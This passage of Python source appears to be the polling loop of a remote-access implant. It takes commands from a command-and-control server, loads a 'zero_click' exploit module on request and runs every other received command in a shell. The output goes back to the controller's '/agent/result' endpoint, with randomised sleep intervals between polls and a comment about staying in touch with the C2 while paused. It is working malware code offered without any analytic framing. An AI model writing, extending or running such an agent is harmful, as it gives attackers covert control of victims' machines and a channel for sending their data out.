            elif cmd and cmd.startswith("ZERO_CLICK "):
                # ZERO_CLICK <action> [args...]
                parts = cmd.split(None, 1)
                action = parts[1] if len(parts) > 1 else "chain"
                try:
                    _mod_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "modules")
                    if _mod_dir not in sys.path: sys.path.insert(0, _mod_dir)
                    import zero_click as _zc
                    out = _zc.run(action)
                except Exception as e:
                    out = f"ZERO_CLICK error: {e}"
                _post(f"/agent/result?id={AID}&cmd=ZERO_CLICK", str(out)[:3000])

            elif cmd and cmd!="PING":
                _post(f"/agent/result?id={AID}&cmd="+_parse.quote(cmd[:80]),_shell(cmd))
        except: pass
        sleep_t=_ctrl.get("interval",POLL_MIN)+random.uniform(0,max(0,POLL_MAX-POLL_MIN))
        # Respect pause — keep polling C2 but at fast rate so we get resume quickly
        if _ctrl.get("paused"): sleep_t=min(sleep_t,5)
        time.sleep(sleep_t)

if __name__=="__main__": main()
